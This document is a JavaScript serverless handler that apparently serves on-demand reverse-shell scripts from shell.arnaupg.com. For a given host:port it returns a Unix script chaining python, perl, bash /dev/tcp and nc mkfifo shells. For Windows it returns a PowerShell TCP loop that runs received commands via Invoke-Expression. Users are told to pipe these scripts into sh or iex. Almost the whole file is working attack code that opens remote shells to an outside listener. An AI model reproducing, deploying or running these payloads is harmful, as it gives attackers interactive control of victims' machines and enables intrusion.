'use strict';

const HOST_RE = /^[A-Za-z0-9.-]{1,253}$/;

const USAGE_UNIX = `echo "[x] shell.arnaupg.com"
echo "    usage: curl https://shell.arnaupg.com/1.2.3.4:1337 | sh"
echo "    missing or invalid host:port (port must be 1-65535)"`;

const USAGE_WIN = `Write-Output "[x] shell.arnaupg.com"
Write-Output "    usage: irm https://shell.arnaupg.com/win/1.2.3.4:1337 | iex"
Write-Output "    missing or invalid host:port (port must be 1-65535)"`;

/* unix */

function pythonCode(host, port) {
  return `import socket,sys
s=socket.socket()
s.settimeout(5)
try:
 s.connect(("${host}",${port}))
except OSError as e:
 sys.stderr.write("[!] ${host}:${port}: %s\\n" % e)
 sys.exit(1)
import os,subprocess
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])`;
}

function perlCommand(host, port) {
  return `perl -e 'use Socket;$i="${host}";$p=${port};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if (connect(S,sockaddr_in($p,inet_aton($i)))) {
  open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
  exec("/bin/sh -i");
} else {
  print STDERR "[!] ${host}:${port}: connect failed\\n";exit 1;
}'`;
}

function ncCommand(host, port) {
  return `rm -f /tmp/f;mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ${host} ${port} >/tmp/f || echo "[!] ${host}:${port}: nc could not connect" >&2`;
}

// Debian and Ubuntu use dash for /bin/sh, which doesn't support /dev/tcp.
function bashCommand(host, port) {
  return `/bin/bash -i >& /dev/tcp/${host}/${port} 0>&1`;
}

function unixScript(host, port) {
  const addr = `${host}:${port}`;
  const out = [`echo "[*] shell.arnaupg.com -> ${addr}"`];

  const candidates = [
    ['python3', `python3 -c '${pythonCode(host, port)}'`],
    ['python', `python -c '${pythonCode(host, port)}'`],
    ['perl', perlCommand(host, port)],
    ['bash', bashCommand(host, port)],
    ['nc', ncCommand(host, port)],
  ];

  for (const [tool, code] of candidates) {
    out.push(`if command -v ${tool} >/dev/null 2>&1; then`);
    out.push(`\techo "[*] using ${tool}"`);
    out.push(code);
    out.push('\texit 0');
    out.push('fi');
  }

  out.push('echo "[*] last resort: /dev/tcp through /bin/sh"');
  out.push(`/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`);
  out.push('echo "[i] no prompt? check your listener, firewall and NAT" >&2');

  return out.join('\n') + '\n';
}

/* windows */

function windowsScript(host, port) {
  return `Write-Output "[*] shell.arnaupg.com -> ${host}:${port}"
$ErrorActionPreference = 'Stop'
try {
  $c = New-Object System.Net.Sockets.TCPClient
  $c.Connect('${host}', ${port})
} catch {
  Write-Output "[!] ${host}:${port}: $($_.Exception.Message)"
  Write-Output "[i] check that your listener is up and the port is open"
  exit 1
}
$s = $c.GetStream()
$buf = New-Object byte[] 65536
while (($i = $s.Read($buf, 0, $buf.Length)) -ne 0) {
  $cmd = (New-Object System.Text.ASCIIEncoding).GetString($buf, 0, $i)
  $out = (Invoke-Expression $cmd 2>&1 | Out-String)
  $out = $out + 'PS ' + (Get-Location).Path + '> '
  $b = (New-Object System.Text.ASCIIEncoding).GetBytes($out)
  $s.Write($b, 0, $b.Length)
  $s.Flush()
}
$c.Close()
`;
}

/* validation */

function parseTarget(raw) {
  const sep = raw.lastIndexOf(':');
  if (sep < 1) return null;

  const host = raw.slice(0, sep);
  const portText = raw.slice(sep + 1);

  if (!HOST_RE.test(host)) return null;
  if (!/^[0-9]{1,5}$/.test(portText)) return null;

  const port = Number(portText);
  if (port < 1 || port > 65535) return null;

  return { host, port };
}

// Vercel forwards the original path in a header after rewriting to /api.
function pathOf(req) {
  const header = req.headers['x-forwarded-uri'] || req.headers['x-invoke-path'];
  const raw = String(header || req.url || '/');

  return raw
    .split('?')[0]
    .replace(/^\/api(?=\/|$)/, '')
    .replace(/^\/+/, '')
    .replace(/\/+$/, '');
}

function render(req) {
  let path = pathOf(req);

  const windows = path === 'win' || path.startsWith('win/');
  if (windows) path = path.slice(3).replace(/^\/+/, '');

  const target = parseTarget(path);
  if (!target) return windows ? USAGE_WIN : USAGE_UNIX;

  return windows
    ? windowsScript(target.host, target.port)
    : unixScript(target.host, target.port);
}

/* handler */

module.exports = (req, res) => {
  const body = render(req);

  res.writeHead(200, {
    'Content-Type': 'text/plain; charset=utf-8',
    'Cache-Control': 'no-store',
    'X-Content-Type-Options': 'nosniff',
    'X-Robots-Tag': 'noindex',
  });
  res.end(body);
};
